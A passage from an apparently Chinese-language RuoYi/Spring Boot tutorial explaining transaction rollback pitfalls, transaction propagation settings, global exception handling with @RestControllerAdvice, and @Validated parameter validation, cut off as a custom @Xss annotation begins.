	<span class="token keyword">int</span> rows <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户岗位关联</span>
	<span class="token function">insertUserPost</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户与角色管理</span>
	<span class="token function">insertUserRole</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 模拟抛出SQLException异常</span>
	<span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SQLException</span><span class="token punctuation">(</span><span class="token string">"发生异常了.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> rows<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>原因分析：因为<code>Spring</code>的默认的事务规则是遇到运行异常<code>（RuntimeException）</code>和程序错误<code>（Error）</code>才会回滚。如果想针对检查异常进行事务回滚，可以在<code>@Transactional</code>注解里使用 <code>rollbackFor</code>属性明确指定异常。<br/> 例如下面这样，就可以正常回滚：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span><span class="token punctuation">(</span>rollbackFor <span class="token operator">=</span> <span class="token class-name">Exception</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 新增用户信息</span>
	<span class="token keyword">int</span> rows <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户岗位关联</span>
	<span class="token function">insertUserPost</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户与角色管理</span>
	<span class="token function">insertUserRole</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 模拟抛出SQLException异常</span>
	<span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SQLException</span><span class="token punctuation">(</span><span class="token string">"发生异常了.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> rows<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>常见坑点2： 在业务层捕捉异常后，发现事务不生效。 这是许多新手都会犯的一个错误，在业务层手工捕捉并处理了异常，你都把异常“吃”掉了，<code>Spring</code>自然不知道这里有错，更不会主动去回滚数据。<br/> 例如：下面这段代码直接导致用户新增的事务回滚没有生效。</li></ul>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 新增用户信息</span>
	<span class="token keyword">int</span> rows <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户岗位关联</span>
	<span class="token function">insertUserPost</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户与角色管理</span>
	<span class="token function">insertUserRole</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 模拟抛出SQLException异常</span>
	<span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">try</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token comment">// 谨慎：尽量不要在业务层捕捉异常并处理</span>
			<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SQLException</span><span class="token punctuation">(</span><span class="token string">"发生异常了.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> rows<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>推荐做法：在业务层统一抛出异常，然后在控制层统一处理。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Transactional</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">// 新增用户信息</span>
	<span class="token keyword">int</span> rows <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">insertUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户岗位关联</span>
	<span class="token function">insertUserPost</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 新增用户与角色管理</span>
	<span class="token function">insertUserRole</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// 模拟抛出SQLException异常</span>
	<span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"发生异常了.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> rows<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><code>Transactional</code>注解的常用属性表：</p>
<table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>propagation</td><td>事务的传播行为，默认值为 REQUIRED。</td></tr><tr><td>isolation</td><td>事务的隔离度，默认值采用 DEFAULT</td></tr><tr><td>timeout</td><td>事务的超时时间，默认值为-1，不超时。如果设置了超时时间(单位秒)，那么如果超过该时间限制了但事务还没有完成，则自动回滚事务。</td></tr><tr><td>read-only</td><td>指定事务是否为只读事务，默认值为 false；为了忽略那些不需要事务的方法，比如读取数据，可以设置 read-only 为 true。</td></tr><tr><td>rollbackFor</td><td>用于指定能够触发事务回滚的异常类型，如果有多个异常类型需要指定，各类型之间可以通过逗号分隔。{xxx1.class, xxx2.class,……}</td></tr><tr><td>noRollbackFor</td><td>抛出 no-rollback-for 指定的异常类型，不回滚事务。{xxx1.class, xxx2.class,……}</td></tr><tr><td>…</td><td></td></tr></tbody></table>
<p>提示</p>
<p>事务的传播机制是指如果在开始当前事务之前，一个事务上下文已经存在，此时有若干选项可以指定一个事务性方法的执行行为。 即:在执行一个@Transactinal注解标注的方法时，开启了事务；当该方法还在执行中时，另一个人也触发了该方法；那么此时怎么算事务呢，这时就可以通过事务的传播机制来指定处理方式。</p>
<p><code>TransactionDefinition</code>传播行为的常量：</p>
<table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>TransactionDefinition.PROPAGATION_REQUIRED</td><td>如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。这是默认值。</td></tr><tr><td>TransactionDefinition.PROPAGATION_REQUIRES_NEW</td><td>创建一个新的事务，如果当前存在事务，则把当前事务挂起。</td></tr><tr><td>TransactionDefinition.PROPAGATION_SUPPORTS</td><td>如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。</td></tr><tr><td>TransactionDefinition.PROPAGATION_NOT_SUPPORTED</td><td>以非事务方式运行，如果当前存在事务，则把当前事务挂起。</td></tr><tr><td>TransactionDefinition.PROPAGATION_NEVER</td><td>以非事务方式运行，如果当前存在事务，则抛出异常。</td></tr><tr><td>TransactionDefinition.PROPAGATION_MANDATORY</td><td>如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。</td></tr><tr><td>TransactionDefinition.PROPAGATION_NESTED</td><td>如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于TransactionDefinition.PROPAGATION_REQUIRED。</td></tr></tbody></table>
<h2><a id="_2111"></a>十一、异常处理</h2>
<p>通常一个<code>web</code>框架中，有大量需要处理的异常。比如业务异常，权限不足等等。前端通过弹出提示信息的方式告诉用户出了什么错误。 通常情况下我们用<code>try.....catch....</code>对异常进行捕捉处理，但是在实际项目中对业务模块进行异常捕捉，会造成代码重复和繁杂， 我们希望代码中只有业务相关的操作，所有的异常我们单独设立一个类来处理它。全局异常就是对框架所有异常进行统一管理。 我们在可能发生异常的方法里<code>throw</code>抛给控制器。然后由全局异常处理器对异常进行统一处理。 如此，我们的<code>Controller</code>中的方法就可以很简洁了。</p>
<p>所谓全局异常处理器就是使用<code>@ControllerAdvice</code>注解。示例如下：</p>
<p>1、统一返回实体定义</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 操作消息提醒
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AjaxResult</span> <span class="token keyword">extends</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * 返回错误消息
     * 
     * @param code 错误码
     * @param msg 内容
     * @return 错误消息
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">AjaxResult</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">AjaxResult</span> json <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> json<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 返回成功消息
     * 
     * @param msg 内容
     * @return 成功消息
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">AjaxResult</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token class-name">String</span> msg<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">AjaxResult</span> json <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> json<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、定义登录异常定义</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 登录异常
 * 
 * @author ruoyi
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>

    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token class-name">String</span> message<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token class-name">String</span> message<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> message<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、基于<code>@ControllerAdvice</code>注解的<code>Controller</code>层的全局异常统一处理</p>
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>exception</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ExceptionHandler</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestControllerAdvice</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>core<span class="token punctuation">.</span>domain<span class="token punctuation">.</span></span><span class="token class-name">AjaxResult</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>ruoyi<span class="token punctuation">.</span>common<span class="token punctuation">.</span>exception<span class="token punctuation">.</span></span><span class="token class-name">LoginException</span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 全局异常处理器
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@RestControllerAdvice</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GlobalExceptionHandler</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> log <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">GlobalExceptionHandler</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">/**
     * 登录异常
     */</span>
    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">LoginException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">loginException</span><span class="token punctuation">(</span><span class="token class-name">LoginException</span> e<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>4、测试访问请求</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SysIndexController</span> 
<span class="token punctuation">{<!-- --></span>
    <span class="token comment">/**
     * 首页方法
     */</span>
    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token class-name">ModelMap</span> mmap<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token comment">/**
         * 模拟用户未登录，抛出业务逻辑异常
         */</span>
        <span class="token class-name">SysUser</span> user <span class="token operator">=</span> <span class="token class-name">ShiroUtils</span><span class="token punctuation">.</span><span class="token function">getSysUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token string">"用户未登录，无法访问请求。"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
		mmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>根据上面代码含义，当我们未登录访问<code>/index</code>时就会发生<code>LoginException</code>业务逻辑异常，按照我们之前的全局异常配置以及统一返回实体实例化，访问后会出现<code>AjaxResult</code>格式<code>JSON</code>数据， 下面我们运行项目访问查看效果。<br/> 界面输出内容如下所示：</p>
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
    <span class="token string">"msg"</span><span class="token operator">:</span> <span class="token string">"用户未登录，无法访问请求。"</span><span class="token punctuation">,</span>
    <span class="token string">"code"</span><span class="token operator">:</span> <span class="token number">500</span>
<span class="token punctuation">}</span>
</code></pre>
<p>对于一些特殊情况，如接口需要返回<code>json</code>，页面请求返回<code>html</code>可以使用如下方法：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">LoginException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">loginException</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">LoginException</span> e<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	log<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ServletUtils</span><span class="token punctuation">.</span><span class="token function">isAjaxRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndView</span><span class="token punctuation">(</span><span class="token string">"/error/500"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>若依系统的全局异常处理器<code>GlobalExceptionHandler</code><br/> 注意：如果全部异常处理返回<code>json</code>，那么可以使用<code>@RestControllerAdvice</code>代替<code>@ControllerAdvice</code>，这样在方法上就可以不需要添加<code>@ResponseBody</code>。</p>
<p>无法捕获异常？</p>
<p>如果您的异常无法捕获，您可以从以下几个方面着手检查</p>
<p>异常是否已被处理，即抛出异常后被catch，打印了日志或抛出了其它异常 异常是否非Controller抛出，即在拦截器或过滤器中出现的异常</p>
<h2><a id="_2303"></a>十二、参数验证</h2>
<p><code>spring boot</code>中可以用<code>@Validated</code>来校验数据，如果数据异常则会统一抛出异常，方便异常中心统一处理。</p>
<h3><a id="1_2307"></a>1、注解参数说明</h3>
<table><thead><tr><th>注解名称</th><th>功能</th></tr></thead><tbody><tr><td>@Xss</td><td>检查该字段是否存在跨站脚本工具</td></tr><tr><td>@Null</td><td>检查该字段为空</td></tr><tr><td>@NotNull</td><td>不能为null</td></tr><tr><td>@NotBlank</td><td>不能为空，常用于检查空字符串</td></tr><tr><td>@NotEmpty</td><td>不能为空，多用于检测list是否size是0</td></tr><tr><td>@Max</td><td>该字段的值只能小于或等于该值</td></tr><tr><td>@Min</td><td>该字段的值只能大于或等于该值</td></tr><tr><td>@Past</td><td>检查该字段的日期是在过去</td></tr><tr><td>@Future</td><td>检查该字段的日期是否是属于将来的日期</td></tr><tr><td>@Email</td><td>检查是否是一个有效的email地址</td></tr><tr><td>@Pattern(regex=,flag=)</td><td>被注释的元素必须符合指定的正则表达式</td></tr><tr><td>@Range(min=,max=,message=)</td><td>被注释的元素必须在合适的范围内</td></tr><tr><td>@Size(min=, max=)</td><td>检查该字段的size是否在min和max之间，可以是字符串、数组、集合、Map等</td></tr><tr><td>@Length(min=,max=)</td><td>检查所属的字段的长度是否在min和max之间,只能用于字符串</td></tr><tr><td>@AssertTrue</td><td>用于boolean字段，该字段只能为true</td></tr><tr><td>@AssertFalse</td><td>该字段的值只能为false</td></tr></tbody></table>
<h3><a id="2_2328"></a>2、数据校验使用</h3>
<p>1、基础使用 因为<code>spring boot</code>已经引入了基础包，所以直接使用就可以了。首先在<code>controller</code>上声明<code>@Validated</code>需要对数据进行校验。</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Validated</span> <span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、然后在对应字段<code>Get方法</code>加上参数校验注解，如果不符合验证要求，则会以<code>message</code>的信息为准，返回给前端。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"用户昵称长度不能超过30个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getNickName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> nickName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"用户账号不能为空"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"用户账号长度不能超过30个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> userName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@Email</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"邮箱格式不正确"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"邮箱长度不能超过50个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> email<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"手机号码长度不能超过11个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPhonenumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> phonenumber<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>也可以直接放在字段上面声明。</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Size</span><span class="token punctuation">(</span>min <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"用户昵称长度不能超过30个字符"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> nickName<span class="token punctuation">;</span>
</code></pre>
<h3><a id="3_2380"></a>3、自定义注解校验</h3>
<p>使用原生的<code>@Validated</code>进行参数校验时，都是特定的注解去校验（例如字段长度、大小、不为空等），我们也可以用自定义的注解去进行校验，例如项目中的<code>@Xss</code>注解。</p>
<p>1、新增<code>Xss</code>注解，设置自定义校验器<code>XssValidator.class</code></p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 自定义xss校验注解
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span>
